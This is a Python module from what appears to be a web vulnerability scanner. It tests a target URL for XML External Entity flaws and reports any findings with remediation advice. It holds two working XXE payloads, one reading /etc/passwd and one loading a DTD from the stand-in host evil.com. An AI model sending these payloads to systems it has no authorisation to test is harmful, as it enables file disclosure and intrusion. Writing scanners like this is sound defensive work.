import asyncio
import uuid
from typing import List, Dict, Any
import httpx

from backend.scanners.base_scanner import BaseScanner
from backend.scanners.scanner_registry import ScannerRegistry
from backend.types.models import ScanInput, Finding, Severity, OwaspCategory, RequestLog


class XxeScanner(BaseScanner):
    """
    A scanner module for detecting XML External Entity (XXE) vulnerabilities.
    """

    metadata = {
        "name": "XML External Entity (XXE)",
        "description": "Detects XXE vulnerabilities by sending crafted XML payloads.",
        "owasp_category": "A03:2021 - Injection",
        "author": "Project Nightingale Team",
        "version": "1.0"
    }

    async def _perform_scan(self, target: str, options: Dict) -> List[Finding]:
        """
        Asynchronously checks for XXE vulnerabilities by sending crafted XML payloads.

        Args:
            target: The target URL for the scan.
            options: Additional options for the scan.

        Returns:
            A list of Finding objects for detected XXE vulnerabilities.
        """
        findings: List[Finding] = []
        target_url = target
        print(f"[*] Starting XXE scan for {target_url}...")

        # XXE payloads to test
        xxe_payloads = [
            """<?xml version="1.0" encoding="ISO-8859-1"?>
            <!DOCTYPE foo [
            <!ELEMENT foo ANY >
            <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
            <foo>&xxe;</foo>""",
            
            """<?xml version="1.0" encoding="ISO-8859-1"?>
            <!DOCTYPE foo [
            <!ELEMENT foo ANY >
            <!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd">
            %xxe;]>
            <foo>&evil;</foo>"""
        ]

        async with httpx.AsyncClient(follow_redirects=True, timeout=10) as client:
            for payload in xxe_payloads:
                try:
                    headers = {
                        "Content-Type": "application/xml"
                    }
                    response = await client.post(target_url, content=payload, headers=headers)
                    
                    # Check for indicators of XXE vulnerability
                    if "root:" in response.text or "/bin/bash" in response.text:
                        findings.append(
                            Finding(
                                id=str(uuid.uuid4()),
                                vulnerability_type="XML External Entity (XXE)",
                                description="Potential XXE vulnerability detected. The application appears to be processing external entities in XML input.",
                                severity=Severity.HIGH,
                                affected_url=target_url,
                                remediation="Disable XML external entity processing in your XML parser. Use a secure XML parser configuration that prevents XXE attacks.",
                                owasp_category=OwaspCategory.A03_INJECTION,
                                proof={
                                    "payload_used": payload,
                                    "response_status": response.status_code,
                                    "response_length": len(response.text)
                                }
                            )
                        )

                except httpx.RequestError as e:
                    print(f"Error testing XXE for {target_url}: {e}")
                except Exception as e:
                    print(f"An unexpected error occurred during XXE scan: {e}")

        print(f"[*] Finished XXE scan for {target_url}.")
        return findings


def register(scanner_registry: ScannerRegistry) -> None:
    """
    Register this scanner with the scanner registry.

    Args:
        scanner_registry: The scanner registry instance.
    """
    scanner_registry.register("xxe", XxeScanner) 